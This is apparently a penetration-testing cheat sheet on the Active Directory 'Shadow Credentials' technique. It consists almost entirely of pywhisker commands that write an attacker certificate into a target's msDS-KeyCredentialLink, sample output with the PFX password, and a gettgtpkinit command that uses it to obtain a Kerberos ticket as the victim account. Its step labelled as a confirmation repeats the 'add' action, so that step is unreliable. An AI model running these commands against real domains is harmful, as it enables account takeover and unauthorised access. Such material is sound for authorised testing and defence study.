# Shadow creds
## Prerequisites
You should have write access to `msDS-KeyCredentialLink` attribute (requires at least AddKeyCredentialLink ACL) of a target object (if the target object itself is compromised, then note that by default in AD each domain computer account has a right to modify it's own `msDS-KeyCredentialLink` attribute property if it's not already present, meaning you probably can freely modify your compromised computeraccount's `msDS-KeyCredentialLink` attribute value). Useraccounts, by default, do not have this right.

## pywhisker
```bash
# generate pfx and add public cert to msDS-KeyCredentialLink of a --target (make sure to save the outputed password)
python pywhisker.py -d "$FQDN_DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_SAMNAME" --action "add"
python pywhisker.py -d 'contoso.org' -u 'TestAcc' -p 'win2016-cli-P@$swd' --target 'AltAdmLocal' --action 'add'
# [+] Saved PFX (#PKCS12) certificate & key at path: 4CHGOm7F.pfx
# [*] Must be used with password: QVcxLbcT0YdVbGDXqQG5

# confirm that msDS-KeyCredentialLink is added
python pywhisker.py -d "$FQDN_DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_SAMNAME" --action "add"


# use this pfx cert/key pair to request a TGT
# grep the password from `pywhisker add` command and put into -pfx-pass
gettgtpkinit $DOMAIN/$USER -cert-pfx $PFX_FILE -pfx-pass $PASSWORD_FOR_PFX -dc-ip $KDC $OUTPUT.ccache
python3 ./PKINITtools/gettgtpkinit.py contoso.org/AltAdmLocal -cert-pfx ../pywhisker/4CHGOm7F.pfx -pfx-pass QVcxLbcT0YdVbGDXqQG5 -dc-ip 192.168.68.179 AltAdmLocal.ccache
```
